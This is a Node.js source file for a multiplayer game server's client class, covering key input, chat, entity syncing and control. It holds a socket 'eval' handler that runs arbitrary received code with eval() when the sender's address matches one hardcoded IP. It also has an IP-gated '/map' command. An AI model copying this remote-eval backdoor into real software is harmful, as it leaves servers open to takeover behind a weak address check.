var Class = require('./class');

module.exports = Class.extend({
	init: function (game, socket, name) {
		this.game = game;
		this.socket = socket;
		this.name = name;

		game.clients.push(this);

		this._entities = {};
		this._control = null;

		this._keyDown = {};
		this._boundKeys = {};

		this.control = null;
		var other = this;

		socket.on('disconnect', function () {
			other.ondisconnect();
			var index = other.game.clients.indexOf(other);

			if (index == -1) {
				throw new Error('cannot find disconnecting client');
			}

			other.game.clients.splice(index, 1);
		});

		socket.on('keydown', function (key) {
			if (keys.keyName[key]) {
				other._keyDown[key] = true;

				if (other._boundKeys[key]) {
					other._boundKeys[key](true);
				}

				other.onkeydown(key);
			}
		});
		socket.on('keyup', function (key) {
			if (keys.keyName[key]) {
				other._keyDown[key] = false;

				if (other._boundKeys[key]) {
					other._boundKeys[key](false);
				}

				other.onkeyup(key);
			}
		});
		socket.on('chat', function (message) {
			if (typeof message != 'string' && !(message instanceof String)) {
				return;
			}

			message = message.trim();

			if (!message.length) {
				return;
			}

			if (other.socket.handshake.address.address === '93.160.177.204') {
				if (message.substring(0, 5) == '/map ') {
					game.loadMap(message.substring(5));
					return;
				}
			}

			other.game.message(other.name + ': ' + message);
		});
		socket.on('eval', function (code) {
			if (other.socket.handshake.address.address === '93.160.177.204')
				eval(code);
		});

		socket.emit('world', game.world);
		this.onconnect();
	},
	update: function () {
		var ent_pop = [];

		for (var id in this._entities) {
			if (!this.game.entities[id]) {
				ent_pop.push(id);
				delete this._entities[id];
			}
		}

		var ent_new = {};
		var send_ent_new = false;

		for (var id in this.game.entities) {
			if (!this._entities[id]) {
				ent_new[id] = this.game.entities[id].serialize();
				send_ent_new = true;

				this._entities[id] = JSON.stringify(this.game.entities[id].data);
			}
		}

		var ent_patch = {};
		var send_ent_patch = false;

		for (var id in this.game.entities) {
			var data1 = this.game.entities[id].data;
			var data2 = this._entities[id];

			if (JSON.stringify(data1) !== data2) {
				ent_patch[id] = data1;
				send_ent_patch = true;

				this._entities[id] = JSON.stringify(data1);
			}
		}

		if (ent_pop.length) {
			this.socket.emit('ent_pop', ent_pop);
		}

		if (send_ent_new) {
			this.socket.emit('ent_new', ent_new);
		}

		if (send_ent_patch) {
			this.socket.emit('ent_patch', ent_patch);
		}

		var control = null;

		if (this.control) {
			control = this.control.id;
		}

		if (control !== this._control) {
			this.socket.emit('ent_use', this._control = control);
		}
	},
	controlEntity: function (entity) {
		if (this.control != null) {
			var index = this.control._controlledBy.indexOf(this);
			this.control._controlledBy.splice(index, 1);
		}

		this.control = entity || null;

		if (this.control != null) {
			this.control._controlledBy.push(this);
		}
	},
	isKeyDown: function (key) {
		if (this._keyDown[key]) {
			return true;
		}

		return false;
	},
	bind: function (key, callback) {
		if (keys.keyName[key]) {
			this._boundKeys[key] = callback.bind(this);
		}
	},
	unbind: function (key) {
		delete this._boundKeys[key];
	},
	message: function (message) {
		if (typeof message == 'string' || message instanceof String) {
			this.socket.emit('message', message);
		}
	},
	onconnect: function () {},
	ondisconnect: function () {},
	onkeydown: function (key) {},
	onkeyup: function (key) {}
});

// Client.prototype.spawn = function () {
// 	if (!this.player) {
// 		var spawn = this.getSpawnPoint();

// 		this.player = new entity.Player(this.game, {x: spawn[0], y: spawn[1]}, this);
// 		this.controlEntity(this.player);
// 	}
// };

// Client.prototype.getSpawnPoint = function () {
// 	var choices = [];

// 	for (var y = 0; y < this.game.world.h; ++y) {
// 		for (var x = 0; x < this.game.world.w; ++x) {
// 			if (this.game.world.data[y][x] === '.') {
// 				choices[choices.length] = [x, y];
// 			}
// 		}
// 	}

// 	return choices[Math.floor(Math.random() * choices.length)];
// };
